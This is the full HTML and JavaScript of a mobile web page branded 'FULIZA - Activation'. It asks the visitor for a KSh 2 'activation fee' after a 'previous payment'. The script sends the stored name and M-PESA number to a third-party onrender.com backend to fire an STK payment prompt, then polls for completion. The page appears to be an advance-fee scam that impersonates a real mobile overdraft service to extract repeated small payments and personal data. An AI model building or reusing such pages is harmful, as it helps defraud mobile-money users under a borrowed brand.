<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>FULIZA - Activation</title>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    padding:16px 10px;
    font-family:Arial,sans-serif;
    background:#00A651;
    color:#FFFFFF;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}

.card{
    width:100%;
    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,0.09),
            rgba(255,255,255,0.035)
        );

    padding:22px 18px 20px;
    border-radius:18px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45),
        inset 0 1px 0 rgba(255,255,255,0.05);

    border:1px solid #000000;
}

.success{
    width:70px;
    height:70px;
    margin:0 auto 14px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:#FFFFFF;
    color:#000000;

    border:2px solid #000000;
    border-radius:50%;

    font-size:38px;
    font-weight:800;
}

h1{
    text-align:center;
    background:#000000;
    color:#FFFFFF;

    font-size:26px;
    font-weight:800;

    margin:2px 0 16px;
    padding:10px;

    border:1px solid #FFFFFF;
    border-radius:10px;
}

p{
    text-align:center;
    font-size:14px;
    line-height:1.6;
    color:#FFFFFF;
}

.name{
    color:#FFFFFF;
    font-weight:800;
}

.amount{
    background:#000000;
    border:1px solid #FFFFFF;
    border-radius:12px;

    padding:16px 10px;
    margin:18px 0;

    text-align:center;

    color:#FFFFFF;

    font-size:28px;
    font-weight:800;
}

.info{
    margin-top:18px;

    background:#000000;

    border:1px solid #FFFFFF;
    border-radius:12px;

    padding:14px;
}

.row{
    display:flex;
    justify-content:space-between;
    align-items:center;

    gap:10px;
    padding:10px 0;

    border-bottom:1px solid
        rgba(255,255,255,0.25);
}

.row:last-child{
    border-bottom:none;
}

.label{
    font-size:13px;
    color:#FFFFFF;
}

.value{
    font-size:14px;
    font-weight:800;
    color:#FFFFFF;
    text-align:right;
    word-break:break-word;
}

.notice{
    margin-top:18px;

    padding:13px;

    background:rgba(255,255,255,0.10);

    border:1px solid #FFFFFF;
    border-radius:10px;

    color:#FFFFFF;

    font-size:13px;
    line-height:1.5;

    text-align:center;
}

.consent{
    margin-top:16px;

    background:#000000;

    border:1px solid #FFFFFF;
    border-radius:10px;

    padding:13px;

    display:flex;
    align-items:flex-start;

    gap:10px;
}

.consent input{
    width:20px;
    height:20px;
    margin:0;

    flex-shrink:0;
}

.consent label{
    color:#FFFFFF;
    font-size:13px;
    line-height:1.5;
}

button{
    width:100%;
    padding:15px;
    margin-top:18px;

    background:#000000;
    color:#FFFFFF;

    border:1px solid #FFFFFF;
    border-radius:11px;

    font-size:16px;
    font-weight:800;

    cursor:pointer;

    box-shadow:
        0 10px 30px rgba(0,0,0,0.30);
}

button:active{
    transform:scale(.98);
}

button:disabled{
    background:rgba(255,255,255,0.25);
    color:#FFFFFF;

    cursor:not-allowed;
    box-shadow:none;
}

#message{
    min-height:22px;
    margin-top:13px;

    color:#FFFFFF;

    font-size:13px;
    font-weight:600;

    line-height:1.5;
    text-align:center;
}

.footer{
    margin-top:15px;
    text-align:center;

    font-size:12px;
    color:#FFFFFF;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .card{
        padding:18px 13px 15px;
        border-radius:15px;
    }

    h1{
        font-size:23px;
    }

    button{
        padding:14px;
        font-size:15px;
    }

}

</style>

</head>

<body>

<div class="container">

<div class="card">

<div class="success">
    ✓
</div>

<h1>
    Complete Activation
</h1>

<p>
    Congratulations,
    <span class="name" id="name">
        Applicant
    </span>
</p>

<p>
    Your previous payment has been successfully
    confirmed.
</p>

<div class="amount">
    Activation Fee: KSh 2
</div>

<p>
    To continue with activation, review the
    activation fee and choose whether you want
    to proceed.
</p>

<div class="info">

    <div class="row">

        <div class="label">
            M-PESA Number
        </div>

        <div class="value" id="phone">
            —
        </div>

    </div>

    <div class="row">

        <div class="label">
            Activation Fee
        </div>

        <div class="value">
            KSh 2
        </div>

    </div>

</div>

<div class="notice">

    If you choose to continue, an M-PESA STK
    prompt for KSh 2 will be sent to the number
    shown above. Review the amount before
    confirming the payment on your phone.

</div>

<div class="consent">

    <input
        type="checkbox"
        id="consent"
    >

    <label for="consent">
        I understand that the activation fee is
        KSh 2 and I want to proceed with the
        payment.
    </label>

</div>

<button
    type="button"
    id="payBtn"
    onclick="payActivation()"
>
    Pay KSh 2 Activation Fee
</button>

<p id="message"></p>

<div class="footer">
    FULIZA
</div>

</div>

</div>


<script>

/* =====================================================
   FULIZA BACKEND
===================================================== */

const BACKEND_URL =
    "https://fuliza-backend-1-o8h6.onrender.com";


/* =====================================================
   ACTIVATION FEE
===================================================== */

const ACTIVATION_FEE = 2;


/* =====================================================
   CUSTOMER DATA
===================================================== */

const savedName =
    localStorage.getItem(
        "fulizaFullName"
    ) ||
    "Applicant";


const savedPhone =
    localStorage.getItem(
        "fulizaaPhoneNumber"
    ) ||
    localStorage.getItem(
        "phoneNumber"
    ) ||
    "";


/* =====================================================
   DISPLAY NAME
===================================================== */

const firstName =
    savedName
        .trim()
        .split(/\s+/)[0] ||
        "Applicant";


document.getElementById(
    "name"
).textContent =
    firstName;


/* =====================================================
   NORMALIZE PHONE
===================================================== */

function normalizePhone(phone){

    let value =
        String(phone || "")
            .trim()
            .replace(/\s+/g,"")
            .replace(/-/g,"");


    if(
        value.startsWith("+254")
    ){

        value =
            value.substring(1);

    }


    if(
        /^(07|01)\d{8}$/.test(value)
    ){

        value =
            "254" +
            value.substring(1);

    }


    return value;

}


/* =====================================================
   DISPLAY PHONE
===================================================== */

const normalizedSavedPhone =
    normalizePhone(
        savedPhone
    );


document.getElementById(
    "phone"
).textContent =
    normalizedSavedPhone ||
    "Not available";


/* =====================================================
   CREATE REFERENCE
===================================================== */

function createReference(){

    return (
        "ACT-" +
        Date.now()
            .toString(36)
            .toUpperCase()
    );

}


/* =====================================================
   PAY ACTIVATION
===================================================== */

async function payActivation(){

    const btn =
        document.getElementById(
            "payBtn"
        );


    const message =
        document.getElementById(
            "message"
        );


    const consent =
        document.getElementById(
            "consent"
        );


    /* -----------------------------------------
       CUSTOMER CONSENT
    ----------------------------------------- */

    if(!consent.checked){

        message.textContent =
            "Please confirm that you want to proceed with the KSh 2 activation fee.";

        return;

    }


    /* -----------------------------------------
       PHONE VALIDATION
    ----------------------------------------- */

    const phone =
        normalizePhone(
            savedPhone
        );


    if(
        !/^254\d{9}$/.test(phone)
    ){

        message.textContent =
            "A valid M-PESA number is required.";

        return;

    }


    /* -----------------------------------------
       CREATE REFERENCE
    ----------------------------------------- */

    const reference =
        createReference();


    /* -----------------------------------------
       SAVE ACTIVATION DATA
    ----------------------------------------- */

    localStorage.setItem(
        "fulizaaActivationReference",
        reference
    );


    localStorage.setItem(
        "fulizaaActivationAmount",
        ACTIVATION_FEE
    );


    localStorage.setItem(
        "fulizaaActivationStatus",
        "SENT"
    );


    /* -----------------------------------------
       DISABLE BUTTON
    ----------------------------------------- */

    btn.disabled = true;

    btn.textContent =
        "Sending STK Push...";


    message.textContent =
        "Please wait. Sending the KSh 2 activation prompt to your M-PESA phone...";


    /* -----------------------------------------
       SEND TO EXISTING PAYLOR ENDPOINT
    ----------------------------------------- */

    try{

        const response =
            await fetch(
                BACKEND_URL +
                "/api/stk-push",
                {

                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:JSON.stringify({

                        phone:
                            phone,

                        amount:
                            ACTIVATION_FEE,

                        selectedLimit:
                            Number(
                                localStorage.getItem(
                                    "fulizaaSelectedLimit"
                                ) ||
                                localStorage.getItem(
                                    "fulizaaSelectedSlot"
                                ) ||
                                0
                            ),

                        fullName:
                            savedName,

                        reference:
                            reference

                    })

                }
            );


        const responseText =
            await response.text();


        let data = {};


        if(
            responseText.trim()
        ){

            try{

                data =
                    JSON.parse(
                        responseText
                    );

            }catch(error){

                throw new Error(
                    "Server returned an invalid response."
                );

            }

        }


        console.log(
            "ACTIVATION STK RESPONSE:",
            data
        );


        /* -----------------------------------------
           SERVER ERROR
        ----------------------------------------- */

        if(
            !response.ok ||
            !data.success
        ){

            throw new Error(

                data.message ||
                data.error ||
                "Activation payment request failed."

            );

        }


        /* -----------------------------------------
           SAVE TRANSACTION ID
        ----------------------------------------- */

        if(
            data.transactionId
        ){

            localStorage.setItem(
                "fulizaaActivationTransactionId",
                data.transactionId
            );

        }


        if(
            data.reference
        ){

            localStorage.setItem(
                "fulizaaActivationReference",
                data.reference
            );

        }


        /* -----------------------------------------
           STK SENT
        ----------------------------------------- */

        btn.textContent =
            "Waiting for Payment...";


        message.textContent =
            "M-PESA STK prompt sent. Enter your PIN to complete the KSh 2 activation fee.";


        /* -----------------------------------------
           START STATUS CHECK
        ----------------------------------------- */

        if(
            data.transactionId
        ){

            checkActivationPayment(
                data.transactionId
            );

        }else{

            message.textContent =
                "STK Push was sent, but no transaction ID was returned.";

            btn.disabled = false;

            btn.textContent =
                "Pay KSh 2 Activation Fee";

        }


    }catch(error){

        console.error(
            "ACTIVATION PAYMENT ERROR:",
            error
        );


        localStorage.setItem(
            "fulizaaActivationStatus",
            "FAILED"
        );


        message.textContent =
            error.message ||
            "Unable to send activation payment request.";


        btn.disabled =
            false;


        btn.textContent =
            "Pay KSh 2 Activation Fee";

    }

}


/* =====================================================
   CHECK ACTIVATION PAYMENT
===================================================== */

function checkActivationPayment(
    transactionId
){

    const btn =
        document.getElementById(
            "payBtn"
        );


    const message =
        document.getElementById(
            "message"
        );


    let attempts = 0;

    const maxAttempts = 100;


    if(
        window.activationChecker
    ){

        clearInterval(
            window.activationChecker
        );

    }


    window.activationChecker =
        setInterval(
            async function(){

                attempts++;


                try{

                    const response =
                        await fetch(

                            BACKEND_URL +
                            "/api/payment-status/" +
                            encodeURIComponent(
                                transactionId
                            ),

                            {
                                method:"GET",
                                cache:"no-store"
                            }

                        );


                    const data =
                        await response
                            .json()
                            .catch(
                                () => ({})
                            );


                    console.log(
                        "ACTIVATION PAYMENT STATUS:",
                        data
                    );


                    const status =
                        String(
                            data.status || ""
                        ).toUpperCase();


                    /* ---------------------------------
                       COMPLETED
                    --------------------------------- */

                    if(
                        status ===
                        "COMPLETED"
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        localStorage.setItem(
                            "fulizaaActivationStatus",
                            "COMPLETED"
                        );


                        if(
                            data.mpesaReceipt
                        ){

                            localStorage.setItem(
                                "fulizaaActivationMpesaReceipt",
                                data.mpesaReceipt
                            );

                        }


                        btn.textContent =
                            "Activation Successful";


                        message.textContent =
                            "Congratulations! Your KSh 2 activation fee has been received successfully.";


                        /*
                           Continue only after the backend
                           confirms COMPLETED.
                        */

                        setTimeout(
                            function(){

                                window.location.replace(
                                    "activation-success.html"
                                );

                            },
                            1500
                        );


                        return;

                    }


                    /* ---------------------------------
                       FAILED
                    --------------------------------- */

                    if(
                        status ===
                        "FAILED"
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        localStorage.setItem(
                            "fulizaaActivationStatus",
                            "FAILED"
                        );


                        message.textContent =
                            "The KSh 2 activation payment was not completed.";


                        btn.disabled =
                            false;


                        btn.textContent =
                            "Pay KSh 2 Activation Fee";


                        return;

                    }


                    /* ---------------------------------
                       TIMEOUT
                    --------------------------------- */

                    if(
                        attempts >=
                        maxAttempts
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        message.textContent =
                            "Payment confirmation is taking longer than expected. Please check your M-PESA transaction status before trying again.";


                        btn.disabled =
                            false;


                        btn.textContent =
                            "Pay KSh 2 Activation Fee";

                    }


                }catch(error){

                    console.error(
                        "ACTIVATION STATUS ERROR:",
                        error
                    );


                    if(
                        attempts >=
                        maxAttempts
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        message.textContent =
                            "Unable to confirm the activation payment right now.";


                        btn.disabled =
                            false;


                        btn.textContent =
                            "Pay KSh 2 Activation Fee";

                    }

                }

            },
            3000
        );

}

</script>

</body>

</html>
